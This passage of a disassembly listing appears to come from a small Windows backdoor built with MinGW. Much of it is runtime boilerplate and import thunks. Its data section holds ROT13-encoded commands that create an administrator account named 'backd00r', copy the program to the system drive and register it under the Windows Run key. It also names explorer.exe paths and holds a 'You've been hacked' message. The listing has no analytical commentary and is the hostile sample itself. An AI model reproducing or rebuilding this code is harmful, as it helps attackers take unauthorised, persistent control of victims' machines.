		mov	[ebp+var_34], eax
		mov	eax, ds:dword_403028
		mov	[ebp+var_30], eax
		mov	eax, ds:dword_40302C
		mov	[ebp+var_2C], eax
		movzx	eax, ds:word_403030
		mov	[ebp+var_28], ax
		mov	[esp+0D8h+var_D8], esi
		call	ds:FindAtomA
		movzx	eax, ax
		sub	esp, 4
		test	eax, eax
		mov	[ebp+var_BC], eax
		jnz	loc_4019DC
		mov	[esp+0D8h+var_D8], 3Ch
		call	malloc
		test	eax, eax
		mov	ebx, eax
		jz	loc_401A10
		cld
		mov	edi, eax
		mov	eax, [ebp+var_BC]
		mov	ecx, 0Fh
		rep stosd
		mov	dword ptr [ebx+4], offset abort
		mov	ecx, 1
		mov	dword ptr [ebx+8], offset ___w32_sharedptr_default_unexpected
		mov	eax, ds:dword_404040
		mov	dword ptr [ebx], 3Ch
		mov	edx, ds:dword_404044
		mov	dword ptr [ebx+28h], 0
		mov	[ebx+14h], eax
		mov	eax, dword_402430
		mov	[ebx+18h], edx
		mov	edx, dword_402434
		mov	[ebx+1Ch], eax
		mov	eax, ds:dword_404050
		mov	[ebx+20h], edx
		mov	dword ptr [ebx+30h], 0FFFFFFFFh
		mov	[ebx+2Ch], eax
		mov	edx, dword_40243C
		mov	eax, dword_402438
		mov	[ebx+38h], edx
		mov	edx, 1Fh
		mov	[ebx+34h], eax
		mov	esi, esi

loc_401930:				; CODE XREF: ___w32_sharedptr_initialize+167j
		mov	eax, ebx
		and	eax, ecx
		cmp	eax, 1
		sbb	eax, eax
		and	al, 20h
		add	ecx, ecx
		add	al, 41h
		mov	[edx+ebp-0B8h],	al
		dec	edx
		jns	short loc_401930
		mov	eax, ds:dword_403010
		mov	[ebp+var_98], eax
		mov	eax, ds:dword_403014
		mov	[ebp+var_94], eax
		mov	eax, ds:dword_403018
		mov	[ebp+var_90], eax
		mov	eax, ds:dword_40301C
		mov	[ebp+var_8C], eax
		mov	eax, ds:dword_403020
		mov	[ebp+var_88], eax
		mov	eax, ds:dword_403024
		mov	[ebp+var_84], eax
		mov	eax, ds:dword_403028
		mov	[ebp+var_80], eax
		mov	eax, ds:dword_40302C
		mov	[ebp+var_7C], eax
		movzx	eax, ds:word_403030
		mov	[ebp+var_78], ax
		lea	eax, [ebp+var_B8]
		mov	[esp+0D8h+var_D8], eax
		call	ds:AddAtomA
		movzx	edi, ax
		sub	esp, 4
		test	edi, edi
		jnz	short loc_401A01

loc_4019BF:				; CODE XREF: ___w32_sharedptr_initialize+22Cj
		xor	edx, edx

loc_4019C1:				; CODE XREF: ___w32_sharedptr_initialize+22Ej
		test	edx, edx
		jnz	short loc_4019E3
		mov	[esp+0D8h+var_D8], ebx
		call	free
		mov	[esp+0D8h+var_D8], esi
		call	ds:FindAtomA
		sub	esp, 4
		movzx	eax, ax

loc_4019DC:				; CODE XREF: ___w32_sharedptr_initialize+BBj
		call	___w32_sharedptr_get
		mov	ebx, eax

loc_4019E3:				; CODE XREF: ___w32_sharedptr_initialize+1E3j
		mov	ds:dword_404070, ebx
		lea	eax, [ebx+4]
		mov	ds:dword_404060, eax
		lea	eax, [ebx+8]
		mov	ds:dword_404080, eax
		lea	esp, [ebp-0Ch]
		pop	ebx
		pop	esi
		pop	edi
		pop	ebp
		retn
; ---------------------------------------------------------------------------

loc_401A01:				; CODE XREF: ___w32_sharedptr_initialize+1DDj
		mov	eax, edi
		call	___w32_sharedptr_get
		cmp	eax, ebx
		mov	edx, edi
		jnz	short loc_4019BF
		jmp	short loc_4019C1
; ---------------------------------------------------------------------------

loc_401A10:				; CODE XREF: ___w32_sharedptr_initialize+D1j
		call	abort
___w32_sharedptr_initialize endp

; ---------------------------------------------------------------------------
		align 10h

; =============== S U B	R O U T	I N E =======================================

; Attributes: library function

___chkstk	proc near		; CODE XREF: _main+2Bp
		push	ecx
		mov	ecx, esp
		add	ecx, 8

probe:					; CODE XREF: ___chkstk+1Bj
		cmp	eax, 1000h
		jb	short done
		sub	ecx, 1000h
		or	dword ptr [ecx], 0
		sub	eax, 1000h
		jmp	short probe
; ---------------------------------------------------------------------------

done:					; CODE XREF: ___chkstk+Bj
		sub	ecx, eax
		or	dword ptr [ecx], 0
		mov	eax, esp
		mov	esp, ecx
		mov	ecx, [eax]
		mov	eax, [eax+4]
		jmp	eax
___chkstk	endp

; ---------------------------------------------------------------------------
		align 10h

; =============== S U B	R O U T	I N E =======================================

; Attributes: library function noreturn	bp-based frame

___eprintf	proc near		; CODE XREF: ___w32_sharedptr_get+79p

var_18		= dword	ptr -18h
var_14		= dword	ptr -14h
var_10		= dword	ptr -10h
var_C		= dword	ptr -0Ch
var_8		= dword	ptr -8
arg_0		= dword	ptr  8
arg_4		= dword	ptr  0Ch
arg_8		= dword	ptr  10h
arg_C		= dword	ptr  14h

		push	ebp
		mov	ebp, esp
		sub	esp, 18h
		mov	eax, [ebp+arg_C]
		mov	[esp+18h+var_8], eax
		mov	eax, [ebp+arg_8]
		mov	[esp+18h+var_C], eax
		mov	eax, [ebp+arg_4]
		mov	[esp+18h+var_10], eax
		mov	eax, [ebp+arg_0]
		mov	[esp+18h+var_14], eax
		mov	eax, ds:_iob
		add	eax, 40h
		mov	[esp+18h+var_18], eax
		call	fprintf
		mov	eax, ds:_iob
		add	eax, 40h
		mov	[esp+18h+var_18], eax
		call	fflush
		call	abort
___eprintf	endp

; ---------------------------------------------------------------------------
		align 10h

; =============== S U B	R O U T	I N E =======================================

; Attributes: thunk

; int execl(const char *, const	char *,	...)
_execl		proc near		; CODE XREF: _main+21Ep _main+23Ap
		jmp	ds:__imp__execl
_execl		endp

; ---------------------------------------------------------------------------
		align 10h
		jmp	ds:__set_app_type
; ---------------------------------------------------------------------------
		align 10h

; =============== S U B	R O U T	I N E =======================================

; Attributes: thunk

; void __cdecl cexit()
_cexit		proc near		; CODE XREF: ___mingw_CRTStartup+E9p
		jmp	ds:__imp__cexit
_cexit		endp

; ---------------------------------------------------------------------------
		align 10h

; =============== S U B	R O U T	I N E =======================================

; Attributes: thunk

__p__environ	proc near		; CODE XREF: ___mingw_CRTStartup+C5p
		jmp	ds:__imp___p__environ
__p__environ	endp

; ---------------------------------------------------------------------------
		align 10h

; =============== S U B	R O U T	I N E =======================================

; Attributes: thunk

; void (__cdecl	*__cdecl signal(int, void (__cdecl *)(int)))(int)
signal		proc near		; CODE XREF: __gnu_exception_handler@4+37p
					; __gnu_exception_handler@4+94p ...
		jmp	ds:__imp_signal
signal		endp

; ---------------------------------------------------------------------------
		align 10h

; =============== S U B	R O U T	I N E =======================================

; Attributes: thunk

__p__fmode	proc near		; CODE XREF: ___mingw_CRTStartup:loc_4011B0p
		jmp	ds:__imp___p__fmode
__p__fmode	endp

; ---------------------------------------------------------------------------
		align 10h

; =============== S U B	R O U T	I N E =======================================

; Attributes: thunk

; int __cdecl setmode(int, int)
_setmode	proc near		; CODE XREF: ___mingw_CRTStartup+85p
					; ___mingw_CRTStartup+ABp ...
		jmp	ds:__imp__setmode
_setmode	endp

; ---------------------------------------------------------------------------
		align 10h

; =============== S U B	R O U T	I N E =======================================

; Attributes: thunk

__getmainargs	proc near		; CODE XREF: ___mingw_CRTStartup+4Ap
		jmp	ds:__imp___getmainargs
__getmainargs	endp

; ---------------------------------------------------------------------------
		align 10h

; =============== S U B	R O U T	I N E =======================================

; Attributes: thunk

; void *__cdecl	malloc(size_t)
malloc		proc near		; CODE XREF: ROT13+1Cp
					; ___w32_sharedptr_initialize+C8p
		jmp	ds:__imp_malloc
malloc		endp

; ---------------------------------------------------------------------------
		align 10h

; =============== S U B	R O U T	I N E =======================================

; Attributes: thunk

; size_t __cdecl strlen(const char *)
strlen		proc near		; CODE XREF: _main+1B4p ROT13+Dp
		jmp	ds:__imp_strlen
strlen		endp

; ---------------------------------------------------------------------------
		align 10h

; =============== S U B	R O U T	I N E =======================================

; Attributes: thunk

; int __cdecl fclose(FILE *)
fclose		proc near		; CODE XREF: _main+D7p
		jmp	ds:__imp_fclose
fclose		endp

; ---------------------------------------------------------------------------
		align 10h

; =============== S U B	R O U T	I N E =======================================

; Attributes: thunk

; int fprintf(FILE *, const char *, ...)
fprintf		proc near		; CODE XREF: _main+C9p	___eprintf+2Dp
		jmp	ds:__imp_fprintf
fprintf		endp

; ---------------------------------------------------------------------------
		align 10h

; =============== S U B	R O U T	I N E =======================================

; Attributes: thunk

; int __cdecl system(const char	*)
system		proc near		; CODE XREF: _main+89p	_main+127p ...
		jmp	ds:__imp_system
system		endp

; ---------------------------------------------------------------------------
		align 10h

; =============== S U B	R O U T	I N E =======================================

; Attributes: thunk

; int sprintf(char *, const char *, ...)
sprintf		proc near		; CODE XREF: _main+7Bp	_main+119p ...
		jmp	ds:__imp_sprintf
sprintf		endp

; ---------------------------------------------------------------------------
		align 10h

; =============== S U B	R O U T	I N E =======================================

; Attributes: thunk

; FILE *__cdecl	fopen(const char *, const char *)
fopen		proc near		; CODE XREF: _main+A5p
		jmp	ds:__imp_fopen
fopen		endp

; ---------------------------------------------------------------------------
		align 10h

; =============== S U B	R O U T	I N E =======================================

; Attributes: thunk

; void __cdecl free(void *)
free		proc near		; CODE XREF: ___w32_sharedptr_initialize+1E8p
		jmp	ds:__imp_free
free		endp

; ---------------------------------------------------------------------------
		align 10h

; =============== S U B	R O U T	I N E =======================================

; Attributes: noreturn thunk

; void __cdecl abort()
abort		proc near		; CODE XREF: ___w32_sharedptr_initialize:loc_401A10p
					; ___eprintf+42p
					; DATA XREF: ...
		jmp	ds:__imp_abort
abort		endp

; ---------------------------------------------------------------------------
		align 10h

; =============== S U B	R O U T	I N E =======================================

; Attributes: thunk

; int __cdecl fflush(FILE *)
fflush		proc near		; CODE XREF: ___eprintf+3Dp
		jmp	ds:__imp_fflush
fflush		endp

; ---------------------------------------------------------------------------
		align 10h

; =============== S U B	R O U T	I N E =======================================

; Attributes: thunk

; LPTOP_LEVEL_EXCEPTION_FILTER __stdcall SetUnhandledExceptionFilter(LPTOP_LEVEL_EXCEPTION_FILTER lpTopLevelExceptionFilter)
SetUnhandledExceptionFilter proc near	; CODE XREF: ___mingw_CRTStartup+11p
		jmp	ds:__imp_SetUnhandledExceptionFilter
SetUnhandledExceptionFilter endp

; ---------------------------------------------------------------------------
		align 10h

; =============== S U B	R O U T	I N E =======================================

; Attributes: noreturn thunk

; void __stdcall ExitProcess(UINT uExitCode)
ExitProcess	proc near		; CODE XREF: ___mingw_CRTStartup+F1p
		jmp	ds:__imp_ExitProcess
ExitProcess	endp

; ---------------------------------------------------------------------------
		align 10h

; =============== S U B	R O U T	I N E =======================================

; Attributes: thunk

; DWORD	__stdcall GetModuleFileNameA(HMODULE hModule, LPSTR lpFilename,	DWORD nSize)
GetModuleFileNameA proc	near		; CODE XREF: _main+4Ep
		jmp	ds:__imp_GetModuleFileNameA
GetModuleFileNameA endp

; ---------------------------------------------------------------------------
		align 10h
		jmp	ds:GetAtomNameA
; ---------------------------------------------------------------------------
		align 10h
		jmp	ds:FindAtomA
; ---------------------------------------------------------------------------
		align 10h
		jmp	ds:AddAtomA
; ---------------------------------------------------------------------------
		align 10h

; =============== S U B	R O U T	I N E =======================================

; Attributes: thunk

; LONG __stdcall RegOpenKeyExA(HKEY hKey, LPCSTR lpSubKey, DWORD ulOptions, REGSAM samDesired, PHKEY phkResult)
RegOpenKeyExA	proc near		; CODE XREF: _main+19Dp
		jmp	ds:__imp_RegOpenKeyExA
RegOpenKeyExA	endp

; ---------------------------------------------------------------------------
		align 10h

; =============== S U B	R O U T	I N E =======================================

; Attributes: thunk

; LONG __stdcall RegSetValueExA(HKEY hKey, LPCSTR lpValueName, DWORD Reserved, DWORD dwType, const BYTE	*lpData, DWORD cbData)
RegSetValueExA	proc near		; CODE XREF: _main+1E8p
		jmp	ds:__imp_RegSetValueExA
RegSetValueExA	endp

; ---------------------------------------------------------------------------
		align 10h

; =============== S U B	R O U T	I N E =======================================

; Attributes: thunk

; LONG __stdcall RegCloseKey(HKEY hKey)
RegCloseKey	proc near		; CODE XREF: _main+1FFp
		jmp	ds:__imp_RegCloseKey
RegCloseKey	endp

; ---------------------------------------------------------------------------
		align 10h

; =============== S U B	R O U T	I N E =======================================

; Attributes: library function static bp-based frame

___sjlj_init_ctor proc near		; DATA XREF: .text:off_401C64o
		push	ebp
		mov	ebp, esp
		pop	ebp
		jmp	___do_sjlj_init
___sjlj_init_ctor endp

; ---------------------------------------------------------------------------
		align 10h
dword_401C60	dd 0FFFFFFFFh		; DATA XREF: ___do_global_ctors+7r
					; ___do_global_ctors:loc_401680r ...
off_401C64	dd offset ___sjlj_init_ctor ; DATA XREF: ___do_global_ctors:loc_40169Ar
					; ___do_global_ctors+47r ...
		dd 0
		dd 0FFFFFFFFh
dword_401C70	dd 64h dup(0)		; DATA XREF: .data:off_402420o
_text		ends

; Section 2. (virtual address 00002000)
; Virtual size			: 00000440 (   1088.)
; Section size in file		: 00000600 (   1536.)
; Offset to raw	data for section: 00001200
; Flags	C0000040: Data Readable	Writable
; Alignment	: default
; ===========================================================================

; Segment type:	Pure data
; Segment permissions: Read/Write
_data		segment	para public 'DATA' use32
		assume cs:_data
		;org 402000h
NCHAHAHAHA_TXT	db 'p:\UNUNUNUN.gkg',0  ; DATA XREF: _main+8Eo
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
NYOUVEBEENHACKE	db 'Lbh',27h,'ir orra unpxrq, fhpxn...',7,0 ; DATA XREF: _main+B0o
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
NCWINNTEXPLORER	db 'p:\jvaag\rkcybere.rkr',0 ; DATA XREF: _main+207o
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
NCWINDOWSEXPLOR	db 'p:\jvaqbjf\rkcybere.rkr',0 ; DATA XREF: _main+223o
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
NBACKD00R	db 'onpxq00e',0         ; DATA XREF: _main+DCo _main+EAo ...
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
NNETUSERSSADDNU	db 'arg hfre %f %f /nqq > ahy',0 ; DATA XREF: _main+F8o
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
NNETLOCALGROUPA	db 'arg ybpnytebhc nqzvavfgengbef %f /nqq > ahy',0 ; DATA XREF: _main+13Ao
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
NCOPYSCNUL	db 'pbcl "%f" "p:\" > ahy',0 ; DATA XREF: _main+56o
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
NSOFTWAREMICROS	db 'Fbsgjner\Zvpebfbsg\Jvaqbjf\PheeragIrefvba\Eha',0 ; DATA XREF: _main+16Ao
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
dword_402400	dd 0FFFFFFFFh		; DATA XREF: ___mingw_CRTStartup+31r
		align 10h
dword_402410	dd 4000h		; DATA XREF: ___mingw_CRTStartup+58w
					; ___mingw_CRTStartup+B5r
		align 10h
off_402420	dd offset dword_401C70	; DATA XREF: ___do_global_dtors+6r
					; ___do_global_dtors+22r ...
		align 10h
dword_402430	dd 0			; DATA XREF: ___w32_sharedptr_initialize+115r
dword_402434	dd 0FFFFFFFFh		; DATA XREF: ___w32_sharedptr_initialize+11Dr
dword_402438	dd 0			; DATA XREF: ___w32_sharedptr_initialize+13Er
dword_40243C	dd 0FFFFFFFFh		; DATA XREF: ___w32_sharedptr_initialize+138r
		align 200h
_data		ends

; Section 3. (virtual address 00003000)
; Virtual size			: 000000F0 (	240.)
; Section size in file		: 00000200 (	512.)
; Offset to raw	data for section: 00001800
; Flags	40000040: Data Readable
; Alignment	: default
; ===========================================================================

; Segment type:	Pure data
; Segment permissions: Read
_rdata		segment	para public 'DATA' use32
		assume cs:_rdata
		;org 403000h
unk_403000	db  77h	; w		; DATA XREF: _main+9Ao
		db    0
aNull		db 'null',0             ; DATA XREF: _main+1D7o
		align 10h
dword_403010	dd 42494C2Dh		; DATA XREF: ___w32_sharedptr_initialize+25r
					; ___w32_sharedptr_initialize+169r
dword_403014	dd 57434347h		; DATA XREF: ___w32_sharedptr_initialize+3Er
					; ___w32_sharedptr_initialize+174r
dword_403018	dd 452D3233h		; DATA XREF: ___w32_sharedptr_initialize+54r
					; ___w32_sharedptr_initialize+17Fr
dword_40301C	dd 2D322D48h		; DATA XREF: ___w32_sharedptr_initialize+6Ar
					; ___w32_sharedptr_initialize+18Ar
dword_403020	dd 4A4C4A53h		; DATA XREF: ___w32_sharedptr_initialize+79r
					; ___w32_sharedptr_initialize+195r
dword_403024	dd 4854472Dh		; DATA XREF: ___w32_sharedptr_initialize+81r
					; ___w32_sharedptr_initialize+1A0r
dword_403028	dd 494D2D52h		; DATA XREF: ___w32_sharedptr_initialize+89r
					; ___w32_sharedptr_initialize+1ABr
dword_40302C	dd 3357474Eh		; DATA XREF: ___w32_sharedptr_initialize+91r
					; ___w32_sharedptr_initialize+1B3r
word_403030	dw 32h			; DATA XREF: ___w32_sharedptr_initialize+99r
					; ___w32_sharedptr_initialize+1BBr
		align 4
aW32_sharedptrS	db 'w32_sharedptr->size == sizeof(W32_EH_SHARED)',0
					; DATA XREF: ___w32_sharedptr_get:loc_401797o
aSUFailedAssert	db '%s:%u: failed assertion `%s',27h,0Ah,0
					; DATA XREF: ___w32_sharedptr_get:loc_4017A9o
		align 10h
a____GccGccConf	db '../../gcc/gcc/config/i386/w32-shared-ptr.c',0
					; DATA XREF: ___w32_sharedptr_get+70o
		align 4
aGetatomnameaAt	db 'GetAtomNameA (atom, s, sizeof(s)) != 0',0
					; DATA XREF: ___w32_sharedptr_get:loc_4017BEo
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
unk_4030F0	db    0			; DATA XREF: __pei386_runtime_relocator+1o
					; __pei386_runtime_relocator:loc_4015FEo
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
_rdata		ends

; Section 4. (virtual address 00004000)
; Virtual size			: 000000B0 (	176.)
; Section size in file		: 00000000 (	  0.)
; Offset to raw	data for section: 00000000
; Flags	C0000080: Bss Readable Writable
; Alignment	: default
; ===========================================================================

; Segment type:	Uninitialized
; Segment permissions: Read/Write
_bss		segment	para public 'BSS' use32
		assume cs:_bss
		;org 404000h
		assume es:nothing, ss:nothing, ds:_data, fs:nothing, gs:nothing
dword_404000	dd ?			; DATA XREF: ___mingw_CRTStartup+25o
					; ___mingw_CRTStartup+D0r
dword_404004	dd ?			; DATA XREF: ___mingw_CRTStartup+43o
					; ___mingw_CRTStartup+DAr
		align 10h
dword_404010	dd ?			; DATA XREF: ___mingw_CRTStartup+4Fr
					; ___mingw_CRTStartup+70r ...
		align 10h
word_404020	dw ?			; DATA XREF: ___main+7r ___main+1Aw
		db    ?	;
		db    ?	;
		db    ?	;
		db    ?	;
		db    ?	;
		db    ?	;
		db    ?	;
		db    ?	;
		db    ?	;
		db    ?	;
		db    ?	;
		db    ?	;
		db    ?	;
		db    ?	;
		db    ?	;
		db    ?	;
		db    ?	;
		db    ?	;
		db    ?	;
		db    ?	;
		db    ?	;
		db    ?	;
		db    ?	;
		db    ?	;
		db    ?	;
		db    ?	;
		db    ?	;
		db    ?	;
		db    ?	;
		db    ?	;
dword_404040	dd ?			; DATA XREF: ___w32_sharedptr_initialize+FAr
dword_404044	dd ?			; DATA XREF: ___w32_sharedptr_initialize+105r
		align 10h
dword_404050	dd ?			; DATA XREF: ___w32_sharedptr_initialize+126r
		align 10h
dword_404060	dd ?			; DATA XREF: ___w32_sharedptr_initialize+20Cw
		align 10h
dword_404070	dd ?			; DATA XREF: ___w32_sharedptr_default_unexpected+1r
					; ___w32_sharedptr_initialize+Cr ...
		align 10h
